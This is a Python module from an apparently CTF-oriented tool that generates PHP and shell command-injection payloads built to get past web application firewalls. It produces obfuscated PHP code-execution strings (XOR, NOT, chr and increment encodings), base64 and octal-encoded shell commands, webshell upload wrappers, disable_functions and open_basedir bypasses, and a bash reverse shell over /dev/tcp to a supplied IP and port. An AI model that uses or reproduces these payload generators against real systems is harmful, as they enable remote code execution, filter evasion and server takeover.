import re
from dataclasses import dataclass
from typing import TYPE_CHECKING, Optional, Tuple

from . import bypass_data
from . import tamper
from . import utils

if TYPE_CHECKING:
    from .auto import AutoContext


@dataclass
class BypassOptions:
    flagfile: str
    read_env: bool
    reflect_shell: bool
    ip: str
    port: int
    phpinfo: bool
    php_version: float = 7.0
    upload: bool = False
    payload_context: str = "any"
    auto_context: Optional["AutoContext"] = None


@dataclass(frozen=True)
class PayloadRecord:
    payload: str
    techniques: Tuple[str, ...]


def _octal_encode(command: str):
    encoded = "".join(f"\\{oct(ord(c))[2:]}" for c in command)
    return f"$'{encoded}'"


def _wildcard_bypass(path: str):
    if not path or path == "/":
        return path
    parts = path.split("/")
    new_parts = []
    for part in parts:
        if len(part) > 1:
            new_parts.append(part[0] + "?" * (len(part) - 1))
        else:
            new_parts.append(part)
    return "/".join(new_parts)


def _base64_pipe_bypass(command: str):
    import base64

    b64_cmd = base64.b64encode(command.encode()).decode()

    used_vars = []
    assign_base64, concat_base64 = utils._split_string_to_vars("base64", exclude_vars=used_vars)
    used_vars.extend(_extract_var_names(assign_base64))
    assign_sh, concat_sh = utils._split_string_to_vars("sh", exclude_vars=used_vars)
    used_vars.extend(_extract_var_names(assign_sh))
    assign_echo, concat_echo = utils._split_string_to_vars("echo", exclude_vars=used_vars)

    return (
        f"{assign_base64}{assign_sh}{assign_echo} "
        f"{concat_echo} {b64_cmd}| {concat_base64} -d| {concat_sh}"
    )


def _extract_var_names(assign_str: str):
    """Extract variable names from assignment string like 'a=bas;b=e64;'"""
    names = []
    for part in assign_str.split(";"):
        if "=" in part:
            names.append(part.split("=", 1)[0])
    return names


def _render_backtick_payloads(command: str):
    payloads = []
    for template in bypass_data.BACKTICK_TEMPLATES:
        if "{cmd}" in template:
            payloads.append(template.format(cmd=command))
    return payloads


def _escape_php_single_quote(command: str):
    return command.replace("\\", "\\\\").replace("'", "\\'")


def _build_popen_payload(command: str):
    escaped = _escape_php_single_quote(command)
    return (
        f"$__h=popen('{escaped}','r');"
        "if($__h){echo stream_get_contents($__h);pclose($__h);}"
    )


def _build_proc_open_payload(command: str):
    escaped = _escape_php_single_quote(command)
    return (
        "$__spec=[0=>['pipe','r'],1=>['pipe','w'],2=>['pipe','w']];"
        f"$__p=proc_open('{escaped}',$__spec,$__pipes);"
        "if(is_resource($__p)){"
        "echo stream_get_contents($__pipes[1]);"
        "if(isset($__pipes[0])){fclose($__pipes[0]);}"
        "if(isset($__pipes[1])){fclose($__pipes[1]);}"
        "if(isset($__pipes[2])){fclose($__pipes[2]);}"
        "proc_close($__p);}"
    )


def _build_chr_exec_payload(func: str, command: str):
    chr_func = utils.generate_php_chr(func)
    chr_arg = utils.generate_php_chr(command)
    return f"$_={chr_func};$_({chr_arg});"


def _build_popen_chr_payload(command: str):
    chr_func = utils.generate_php_chr("popen")
    chr_arg = utils.generate_php_chr(command)
    return (
        f"$__f={chr_func};"
        f"$__h=$__f({chr_arg},'r');"
        "if($__h){echo stream_get_contents($__h);pclose($__h);}"
    )


def _build_proc_open_chr_payload(command: str):
    chr_func = utils.generate_php_chr("proc_open")
    chr_arg = utils.generate_php_chr(command)
    return (
        f"$__f={chr_func};"
        "$__spec=[0=>['pipe','r'],1=>['pipe','w'],2=>['pipe','w']];"
        f"$__p=$__f({chr_arg},$__spec,$__pipes);"
        "if(is_resource($__p)){"
        "echo stream_get_contents($__pipes[1]);"
        "if(isset($__pipes[0])){fclose($__pipes[0]);}"
        "if(isset($__pipes[1])){fclose($__pipes[1]);}"
        "if(isset($__pipes[2])){fclose($__pipes[2]);}"
        "proc_close($__p);}"
    )


def _to_php_expr(payload: str):
    expr = payload.strip()
    if not expr:
        return None
    if expr.endswith(";"):
        expr = expr[:-1].strip()
    if not expr:
        return None
    return expr


def _render_upload_wrapper(template: str, payload: str, expr: str):
    if "{expr}" in template:
        if expr is None:
            return None
        return template.format(payload=payload, expr=expr)
    return template.format(payload=payload, expr=expr)


def _is_upload_wrapper_like_payload(payload: str):
    normalized = payload.strip().lower()
    if not normalized:
        return False
    if normalized.startswith("<?"):
        return True
    if normalized.startswith("<%"):
        return True
    if normalized.startswith('<script language="php">'):
        return True
    if normalized.startswith("gif89a<?"):
        return True
    if normalized.startswith("gif89a<%"):
        return True
    if normalized.startswith('gif89a<script language="php">'):
        return True
    if "<?" in normalized and "?>" in normalized:
        return True
    if "<%" in normalized and "%>" in normalized:
        return True
    if '<script language="php">' in normalized and "</script>" in normalized:
        return True
    return False


def _is_php_style_payload(payload: str):
    stripped = payload.strip()
    lowered = stripped.lower()
    if not stripped:
        return False

    # Shell ANSI-C quoting starts with $'...', which is not valid PHP code.
    if stripped.startswith("$'") or stripped.startswith('$"'):
        return False

    if _is_upload_wrapper_like_payload(stripped):
        return True

    if lowered.startswith("`") and lowered.endswith("`"):
        return True

    php_prefixes = (
        "phpinfo(",
        "print_r(",
        "var_dump(",
        "var_export(",
        "echo ",
        "echo(",
        "print(",
        "show_source(",
        "highlight_file(",
        "readgzfile(",
        "include ",
        "include(",
        "require ",
        "require(",
        "include_once(",
        "require_once(",
        "eval(",
        "assert(",
        "system(",
        "passthru(",
        "shell_exec(",
        "exec(",
        "popen(",
        "proc_open(",
        "call_user_func(",
        "die(",
        "exit(",
        "$",
        "(~",
    )
    if lowered.startswith(php_prefixes):
        return True

    if "$_=" in lowered or "get_defined_vars" in lowered or "getallheaders" in lowered:
        return True

    return False


def _is_shell_style_payload(payload: str):
    stripped = payload.strip()
    if not stripped:
        return False
    if _is_upload_wrapper_like_payload(stripped):
        return False
    return not _is_php_style_payload(stripped)


def _is_eval_safe_php_payload(payload: str):
    stripped = payload.strip()
    if not _is_php_style_payload(stripped):
        return False
    if stripped.startswith("`") and stripped.endswith("`"):
        return False
    return True


def _normalize_payload_context(payload_context: str):
    normalized = str(payload_context or "any").strip().lower()
    if normalized in {"php", "php_eval", "php_code", "eval"}:
        return "php_code"
    if normalized in {"shell", "shell_cmd", "shell_command", "command"}:
        return "shell_command"
    if normalized in {"file", "path", "file_path", "file_read_path"}:
        return "file_path"
    if normalized in {"query", "query_value", "url_query", "url_query_value"}:
        return "url_query_value"
    return "any"


def _is_file_path_payload(payload: str):
    stripped = payload.strip()
    lowered = stripped.lower()
    if not stripped:
        return False
    if _is_upload_wrapper_like_payload(stripped) or _is_php_style_payload(stripped):
        return False
    command_prefixes = (
        "cat ",
        "tac ",
        "nl ",
        "more ",
        "less ",
        "head ",
        "tail ",
        "sort ",
        "od ",
        "strings ",
        "paste ",
        "grep ",
        "sed ",
        "rev ",
        "uniq ",
        "base64 ",
        "awk ",
        "dd ",
        "perl ",
        "busybox ",
        "vi ",
        "shuf ",
        "xargs ",
        "cut ",
        "column ",
        "pr ",
        "xxd ",
        "file ",
        "env ",
        "bash ",
        "tar ",
    )
    if lowered.startswith(command_prefixes):
        return False
    shell_tokens = ("`", "$(", "${ifs}", "$ifs", "&&", "||", "|", ";")
    if any(token in lowered for token in shell_tokens):
        return False
    if " " in stripped:
        return False
    return bool(
        stripped.startswith(("/", "./", "../"))
        or "://" in lowered
        or "%" in stripped
        or "\x00" in stripped
        or re.fullmatch(r"[A-Za-z0-9._%+\\/-]+", stripped)
    )


def _filter_payloads_for_context(payloads, payload_context: str):
    normalized = _normalize_payload_context(payload_context)
    if normalized == "any":
        return utils.dedupe_preserve_order(payloads)

    if normalized in {"file_path", "url_query_value"}:
        return utils.dedupe_preserve_order(
            [payload for payload in payloads if _is_file_path_payload(payload)]
        )

    matcher = _is_eval_safe_php_payload if normalized == "php_code" else _is_shell_style_payload
    filtered = [payload for payload in payloads if matcher(payload)]
    return utils.dedupe_preserve_order(filtered)


def _apply_upload_php_wrappers(payloads, php_version: float):
    templates = list(bypass_data.SHORT_TAG_TEMPLATES)
    templates.extend(bypass_data.UPLOAD_MODERN_WRAPPER_TEMPLATES)
    if php_version < 7.0:
        templates.extend(bypass_data.UPLOAD_LEGACY_WRAPPER_TEMPLATES)

    wrapped = []
    for payload in payloads:
        if not _is_php_style_payload(payload):
            continue
        if _is_upload_wrapper_like_payload(payload):
            continue
        expr = _to_php_expr(payload)
        for template in templates:
            rendered = _render_upload_wrapper(template, payload, expr)
            if rendered:
                wrapped.append(rendered)
    return wrapped


def _apply_upload_shell_wrappers(payloads):
    wrapped = []
    for payload in payloads:
        if not _is_shell_style_payload(payload):
            continue
        cmd = payload.strip()
        for template in bypass_data.UPLOAD_SHELL_CMD_WRAPPER_TEMPLATES:
            wrapped.append(template.format(cmd=cmd))
    return wrapped


def _analyze_block_reasons(payload: str, waf_words, waf_chars, waf_regex):
    reasons = {
        "blocked_words": [],
        "blocked_chars": [],
        "regex_match": None,
    }

    lower_payload = payload.lower()
    if waf_words:
        for word in waf_words:
            if word and word.lower() in lower_payload:
                reasons["blocked_words"].append(word)

    if waf_chars:
        reasons["blocked_chars"] = [ch for ch in set(payload) if ch in waf_chars]

    if waf_regex:
        match = waf_regex.search(payload)
        if match:
            reasons["regex_match"] = match.group(0)

    return reasons


def _apply_space_replacements(payload: str):
    if " " not in payload:
        return [payload]

    candidates = [payload]
    for replacement in bypass_data.SPACE_BYPASS_REPLACEMENTS:
        candidates.append(payload.replace(" ", replacement))
    return utils.dedupe_preserve_order(candidates)


def _is_space_blocked(reasons):
    if " " in reasons["blocked_chars"]:
        return True
    if any(" " in word for word in reasons["blocked_words"]):
        return True
    regex_match = reasons["regex_match"]
    if regex_match and " " in regex_match:
        return True
    return False


def _apply_targeted_replacements(payload: str, waf_words, waf_chars, waf_regex, payload_context="any"):
    reasons = _analyze_block_reasons(payload, waf_words, waf_chars, waf_regex)
    candidates = [payload]

    if _is_space_blocked(reasons):
        candidates.extend(_apply_space_replacements(payload))

    candidates.extend(
        tamper.apply_contextual_tampers(
            payload,
            reasons,
            payload_context=payload_context,
            shell_like=_is_shell_style_payload(payload),
        )
    )

    return utils.dedupe_preserve_order(candidates)


def _build_targeted_candidates(payloads, waf_words, waf_chars, waf_regex, payload_context="any"):
    targeted = []
    for payload in payloads:
        targeted.extend(
            _apply_targeted_replacements(
                payload,
                waf_words,
                waf_chars,
                waf_regex,
                payload_context=payload_context,
            )
        )
    return utils.dedupe_preserve_order(targeted)


def infer_payload_techniques(payload: str):
    text = payload or ""
    lowered = text.lower()
    labels = []

    def add(label):
        if label not in labels:
            labels.append(label)

    if _is_upload_wrapper_like_payload(text):
        add("upload_wrapper")
    if "`" in text:
        add("shell_backticks")
    if lowered.startswith("$'"):
        add("shell_octal")
    if "${ifs}" in lowered or "$ifs$9" in lowered:
        add("tamper:space2ifs")
    if "\t" in text or "%09" in lowered or "\\t" in lowered:
        add("tamper:space2htab")
    if "+" in text and " " not in text:
        add("tamper:space2plus")
    if "${pwd:0:1}" in lowered:
        add("tamper:slash2env")
    if "''" in text:
        add("tamper:singlequotes")
    if '""' in text:
        add("tamper:doublequotes")
    if re.search(r"[A-Za-z]\\[A-Za-z]", text):
        add("tamper:backslashes")
    if "${purewaf_x}" in lowered:
        add("tamper:uninitializedvariable")
    if "php://filter" in lowered:
        add("php_stream_filter")
    if "data://text/plain" in lowered:
        add("php_data_wrapper")
    if "getallheaders" in lowered:
        add("header_exec")
    if "get_defined_vars" in lowered:
        add("variable_hijack")
    if "scandir" in lowered or "glob(" in lowered or "directoryiterator" in lowered:
        add("directory_enum")
    if "chr(" in lowered:
        add("php_chr")
    if "(~" in lowered or "~'" in lowered:
        add("php_not")
    if "^" in text:
        add("php_xor")
    if "$____" in text:
        add("php_increment")
    if "nan" in lowered or "$$_[" in text:
        add("non_alnum_post_gateway")
    if "open_basedir" in lowered or "glob://" in lowered:
        add("open_basedir_bypass")
    if "ld_preload" in lowered or "ffi::cdef" in lowered or "pcntl_exec" in lowered:
        add("disable_functions_bypass")
    if any(token in lowered for token in ("system(", "passthru(", "shell_exec(", "exec(", "popen(", "proc_open(")):
        add("php_exec_wrapper")
    if any(lowered.startswith(cmd) for cmd in ("cat ", "tac ", "nl ", "sort ", "od ", "strings ", "dd ", "tail ", "head ")):
        add("file_read_shell")
    if "include" in lowered or "require" in lowered:
        add("php_include")
    if not labels:
        add("raw")
    return tuple(labels)


def build_payload_record(payload: str):
    return PayloadRecord(payload=payload, techniques=infer_payload_techniques(payload))


def generate_candidate_records(options: BypassOptions):
    return [build_payload_record(payload) for payload in generate_candidates(options)]


def _append_increment_with_url(payloads, raw_payload: str):
    payloads.append(raw_payload)
    encoded_payload = utils.url_encode(raw_payload)
    if encoded_payload != raw_payload:
        payloads.append(encoded_payload)


def _generate_php_rce_payloads(command: str, php_version: float):
    payloads = []
    payloads.extend(_render_backtick_payloads(command))

    for func in bypass_data.PHP_EXEC_WRAPPERS:
        if func in {"popen", "proc_open"}:
            continue

        if php_version >= 7.0:
            not_func = utils.generate_php_not(func)
            not_arg = utils.generate_php_not(command)
            if not_func and not_arg:
                payloads.append(f"{not_func}({not_arg});")

        xor_func = utils.generate_php_xor(func)
        xor_arg = utils.generate_php_xor(command)
        if xor_func and xor_arg:
            payloads.append(f"$_={xor_func};$_({xor_arg});")

        inc_func_code = utils.generate_php_increment(func)
        if inc_func_code and xor_arg:
            increment_payload = f"{inc_func_code};$_____({xor_arg});"
            _append_increment_with_url(payloads, increment_payload)

        payloads.append(_build_chr_exec_payload(func, command))

    if "popen" in bypass_data.PHP_EXEC_WRAPPERS:
        payloads.append(_build_popen_payload(command))
        payloads.append(_build_popen_chr_payload(command))
    if "proc_open" in bypass_data.PHP_EXEC_WRAPPERS:
        payloads.append(_build_proc_open_payload(command))
        payloads.append(_build_proc_open_chr_payload(command))

    return payloads


def _append_upload_exec_payloads(payloads):
    payloads.extend(bypass_data.UPLOAD_EXEC_TEMPLATES)
    for cmd in bypass_data.UPLOAD_EXEC_TEMPLATES:
        for wrapper in bypass_data.UPLOAD_EXEC_WRAPPER_TEMPLATES:
            payloads.append(wrapper.format(cmd=cmd))


def _safe_format(template: str, **values) -> str:
    """
    _safe_format("cat {path}; find . -exec echo {} \\;", path="/flag")

    替换为：

    "cat /flag; find . -exec echo {} \\;"
    """
    out = template
    for key, val in values.items():
        out = out.replace("{" + key + "}", str(val))
    return out


def _render_argument_injection_payloads(options: "BypassOptions"):
    ctx = options.auto_context
    if ctx is None or not ctx.fixed_command_prefix:
        return []
    prefix = ctx.fixed_command_prefix.lower()
    templates = bypass_data.AUTO_ARG_INJECT_BY_CMD.get(prefix)
    if not templates:
        return []
    path = options.flagfile or "/flag"
    rendered = []
    for tpl in templates:
        arg = _safe_format(tpl, path=path, ip=options.ip, port=options.port)
        rendered.append(f"{prefix} {arg}")
        # Also emit a plain `arg`-only variant in case auto runs with a sink
        # that already prepends the prefix.
        rendered.append(arg)
    return rendered


def _render_sanitizer_aware_payloads(options: "BypassOptions"):
    ctx = options.auto_context
    if ctx is None or not ctx.sanitizers:
        return []
    out = []
    path = options.flagfile or "/flag"
    for san in ctx.sanitizers:
        if san == "escapeshellarg":
            out.extend(
                _safe_format(t, path=path, ip=options.ip, port=options.port)
                for t in bypass_data.AUTO_ESCAPESHELLARG_GADGETS
            )
        elif san == "escapeshellcmd":
            out.extend(bypass_data.AUTO_ESCAPESHELLCMD_GADGETS)
        elif san == "addslashes":
            out.extend(_safe_format(t, path=path) for t in bypass_data.AUTO_ADDSLASHES_SAFE)
        elif san in {"htmlspecialchars", "htmlentities"}:
            out.extend(
                _safe_format(t, path=path) for t in bypass_data.AUTO_HTMLSPECIALCHARS_SAFE
            )
    return out


def _render_precise_webshell_payloads(options: "BypassOptions"):
    ctx = options.auto_context
    if ctx is None:
        return []
    out = []
    path = options.flagfile or "/flag"
    key = ctx.input_key or "x"
    if ctx.sink_function in {"eval", "assert"} or (
        ctx.sink_function == "" and ctx.input_key
    ):
        for tpl in bypass_data.AUTO_PRECISE_EVAL_TEMPLATES:
            out.append(_safe_format(tpl, key=key, path=path))
    if ctx.sink_function in {"include", "include_once", "require", "require_once"}:
        b64 = utils.base64_encode(f"<?php system('cat {path}');?>")
        for tpl in bypass_data.AUTO_PRECISE_INCLUDE_TEMPLATES:
            out.append(_safe_format(tpl, path=path, b64=b64))
    return out


def _render_file_read_path_payloads(options: "BypassOptions"):
    ctx = options.auto_context
    if ctx is None:
        return []
    if ctx.sink_function not in {"file_get_contents", "readfile", "highlight_file", "show_source"}:
        return []
    path = options.flagfile or "/flag"
    return [_safe_format(tpl, path=path) for tpl in bypass_data.AUTO_FILE_READ_PATH_TEMPLATES]


def _render_php7_only_payloads(options: "BypassOptions"):
    ctx = options.auto_context
    if ctx is None:
        return []
    version = ctx.php_version_hint if ctx.php_version_hint is not None else options.php_version
    if version is None or version < 7.0:
        return []
    path = options.flagfile or "/flag"
    return [_safe_format(t, path=path) for t in bypass_data.AUTO_PHP7_ONLY]


def _render_open_basedir_payloads(options: "BypassOptions"):
    ctx = options.auto_context
    if ctx is None or not ctx.open_basedir:
        return []
    path = options.flagfile or "/flag"
    return [_safe_format(t, path=path) for t in bypass_data.AUTO_OPEN_BASEDIR_BYPASS]


def _render_disable_fn_payloads(options: "BypassOptions"):
    ctx = options.auto_context
    if ctx is None or not ctx.disable_functions:
        return []
    disabled = {d.lower() for d in ctx.disable_functions}
    path = options.flagfile or "/flag"
    out = []
    for tpl in bypass_data.AUTO_DISABLE_FN_BYPASS:
        rendered = _safe_format(tpl, path=path)
        # Skip templates that use a disabled function.
        first_call = rendered.split("(")[0].rstrip()
        first_name = first_call.rsplit(";", 1)[-1].strip().lstrip("$")
        if first_name.lower() in disabled:
            continue
        out.append(rendered)
    return out


def _render_preprocessor_wrapped(options: "BypassOptions", existing):
    """Apply preprocessor-aware transforms to the existing candidate pool."""
    ctx = options.auto_context
    if ctx is None or not ctx.preprocessors:
        return []
    out = []
    pp = [p.lower() for p in ctx.preprocessors]
    url_rounds = pp.count("urldecode") + pp.count("rawurldecode")
    wraps_base64 = "base64_decode" in pp
    for payload in existing:
        # urldecode round-trip: pre-encode the payload N times so the server
        # decoder restores it to the original.
        enc = payload
        for _ in range(url_rounds):
            enc = utils.url_encode(enc)
        if enc != payload:
            out.append(enc)
        if wraps_base64:
            out.append(utils.base64_encode(payload))
    return out


def _generate_auto_only_candidates(options: "BypassOptions", base_candidates):
    out = []
    out.extend(_render_argument_injection_payloads(options))
    out.extend(_render_sanitizer_aware_payloads(options))
    out.extend(_render_precise_webshell_payloads(options))
    out.extend(_render_file_read_path_payloads(options))
    out.extend(_render_php7_only_payloads(options))
    out.extend(_render_open_basedir_payloads(options))
    out.extend(_render_disable_fn_payloads(options))
    out.extend(_render_preprocessor_wrapped(options, base_candidates + out))
    return out


def generate_candidates(options: BypassOptions):
    payloads = []
    target_cmd = None

    root_discovery_mode = (
        options.flagfile == "/"
        and not options.read_env
        and not options.reflect_shell
        and not options.phpinfo
    )

    if options.flagfile:
        if root_discovery_mode:
            payloads.extend(bypass_data.ROOT_DISCOVERY_TEMPLATES)
            payloads.extend(bypass_data.DIRECTORY_ENUM_TEMPLATES)
            payloads.extend(_render_backtick_payloads("ls /"))
        else:
            target_cmd = f"cat {options.flagfile}"

            for template in bypass_data.READFILE_TEMPLATES:
                payloads.append(template.format(path=options.flagfile, keyword="flag"))
                payloads.append(template.format(path=_wildcard_bypass(options.flagfile), keyword="flag"))
                payloads.append(template.format(path=utils.obfuscate_filename_escape(options.flagfile), keyword="flag"))
                payloads.append(template.format(path=utils.obfuscate_filename_quotes(options.flagfile), keyword="flag"))

            path_variants = [
                options.flagfile,
                _wildcard_bypass(options.flagfile),
                utils.obfuscate_filename_escape(options.flagfile),
                utils.obfuscate_filename_quotes(options.flagfile),
            ]
            for cmd_template in bypass_data.BACKTICK_COMMAND_TEMPLATES:
                for path_variant in path_variants:
                    cmd = cmd_template.format(path=path_variant)
                    payloads.extend(_render_backtick_payloads(cmd))

            for template in bypass_data.INCLUDE_TEMPLATES:
                payloads.append(template.format(path=options.flagfile))

            payloads.extend(bypass_data.FILE_ENUM_TEMPLATES)
            if options.flagfile == "/":
                payloads.extend(bypass_data.ROOT_DISCOVERY_TEMPLATES)

    if options.read_env:
        payloads.extend(bypass_data.READ_ENV_TEMPLATES)
        _append_upload_exec_payloads(payloads)
        target_cmd = "env"

    if options.reflect_shell:
        for template in bypass_data.REFLECT_SHELL_TEMPLATES:
            payloads.append(template.format(ip=options.ip, port=options.port))

        _append_upload_exec_payloads(payloads)

        shell_cmd = f"bash -c 'bash -i >& /dev/tcp/{options.ip}/{options.port} 0>&1'"
        for template in bypass_data.WEBSHELL_TEMPLATES:
            payloads.append(template.format(cmd=shell_cmd))

        target_cmd = shell_cmd

    if options.phpinfo:
        for template in bypass_data.PHPINFO_TEMPLATES:
            if template.startswith("(") and template.endswith(");") and options.php_version < 7.0:
                continue
            payloads.append(template)
        target_cmd = "phpinfo"

    if options.read_env or options.phpinfo:
        payloads.extend(bypass_data.HEADER_EXEC_TEMPLATES)

    if options.reflect_shell or options.phpinfo:
        payloads.extend(bypass_data.VARIABLE_HIJACK_TEMPLATES)

    if target_cmd:
        payloads.append(bypass_data.NON_ALNUM_ASSERT_POST_PAYLOAD)
        payloads.append(utils.generate_nan_seed_post_gateway())
        if target_cmd == "phpinfo":
            inc_code = utils.generate_php_increment("phpinfo")
            if inc_code:
                increment_payload = f"{inc_code};$_____();"
                _append_increment_with_url(payloads, increment_payload)

            if options.php_version >= 7.0:
                not_code = utils.generate_php_not("phpinfo")
                payloads.append(f"{not_code}();")

            chr_phpinfo = utils.generate_php_chr("phpinfo")
            payloads.append(f"$_={chr_phpinfo};$_();")
        else:
            payloads.extend(_generate_php_rce_payloads(target_cmd, options.php_version))

    if options.upload:
        raw_payloads = payloads.copy()
        shell_wrapped = _apply_upload_shell_wrappers(raw_payloads)
        php_wrapped = _apply_upload_php_wrappers(raw_payloads, options.php_version)
        existing_wrapped = [p for p in raw_payloads if _is_upload_wrapper_like_payload(p)]
        payloads = utils.dedupe_preserve_order(shell_wrapped + php_wrapped + existing_wrapped)

    if not options.upload:
        base_payloads = payloads.copy()
        for payload in base_payloads:
            if ";" not in payload and "(" not in payload:
                payloads.append(_base64_pipe_bypass(payload))

    if not root_discovery_mode and not options.upload:
        simple_cmds = ["ls", "cat /flag", "tac /flag", "env"]
        for cmd in simple_cmds:
            payloads.append(_octal_encode(cmd))

    # Auto-only
    if options.auto_context is not None:
        auto_only = _generate_auto_only_candidates(options, payloads)
        payloads.extend(auto_only)

    candidates = utils.dedupe_preserve_order(payloads)
    candidates = [payload for payload in candidates if payload != "`/`"]
    return _filter_payloads_for_context(candidates, options.payload_context)


def apply_encodings(payloads, strategies):
    encoded = []
    for payload in payloads:
        for _name, encoder in strategies:
            try:
                encoded.append(encoder(payload))
            except Exception:
                continue
    return utils.dedupe_preserve_order(encoded)


def filter_payloads(
    payloads,
    waf_words,
    waf_chars,
    waf_regex,
    limit_length,
    show_progress=True,
    verbose=False,
    progress_callback=None,
    trace_callback=None,
):
    passed = []
    progress = ProgressBar(len(payloads), verbose=verbose) if show_progress else None
    total = len(payloads)
    for idx, payload in enumerate(payloads, start=1):
        if progress:
            progress.update(idx)
        if progress_callback and (idx == 1 or idx % 100 == 0 or idx == total):
            progress_callback(
                {
                    "type": "progress",
                    "current": idx,
                    "total": total,
                    "passed": len(passed),
                }
            )
        allowed = utils.is_payload_allowed(payload, waf_words, waf_chars, waf_regex, limit_length)
        if trace_callback:
            event = {
                "type": "filter",
                "current": idx,
                "total": total,
                "payload": payload,
                "techniques": list(infer_payload_techniques(payload)),
                "allowed": allowed,
                "payload_length": len(payload),
            }
            if not allowed:
                blocked = _analyze_block_reasons(payload, waf_words, waf_chars, waf_regex)
                if limit_length is not None and len(payload) > limit_length:
                    blocked["limit_length"] = limit_length
                event["blocked"] = blocked
            trace_callback(event)
        if allowed:
            passed.append(payload)
            if progress:
                progress.mark_pass(payload)
            if progress_callback and verbose:
                progress_callback(
                    {
                        "type": "pass",
                        "current": idx,
                        "total": total,
                        "passed": len(passed),
                        "payload": payload,
                    }
                )
    if progress:
        progress.finish()
    return passed


class ProgressBar:
    def __init__(self, total, width=24, stream=None, verbose=False):
        import sys

        self.total = max(int(total), 0)
        self.width = max(int(width), 5)
        self.stream = stream or sys.stdout
        self.current = 0
        self.passed = 0
        self.verbose = verbose
        self.last_snapshot = None

        isatty = getattr(self.stream, "isatty", None)
        self.dynamic = bool(isatty() if callable(isatty) else False)

        if not self.dynamic:
            self._write_line(end="\n", force=True)

    def update(self, current):
        self.current = current
        if self.dynamic:
            self._write_line()

    def mark_pass(self, payload):
        self.passed += 1
        if self.verbose:
            if self.dynamic:
                self._write_line(end="\n", force=True)
            self._write(f"PASS: {payload}\n")
            if self.dynamic:
                self._write_line(force=True)
        elif self.dynamic:
            self._write_line()

    def finish(self):
        self.current = self.total
        if self.dynamic:
            if self.last_snapshot == (self.current, self.passed):
                self._write("\n")
            else:
                self._write_line(end="\n")
        else:
            self._write_line(end="\n", force=True)

    def _write_line(self, end="", force=False):
        snapshot = (self.current, self.passed)
        if not force and snapshot == self.last_snapshot:
            return
        self.last_snapshot = snapshot

        bar = self._render_bar()
        if self.dynamic:
            msg = f"\r\033[2K{bar} {self.current}/{self.total} passed:{self.passed}"
        else:
            msg = f"{bar} {self.current}/{self.total} passed:{self.passed}"
        self._write(msg + end)

    def _render_bar(self):
        if self.total <= 0:
            filled = 0
        else:
            filled = int(self.width * (self.current / self.total))
        return "[" + ("=" * filled).ljust(self.width, ".") + "]"

    def _write(self, text):
        self.stream.write(text)
        self.stream.flush()
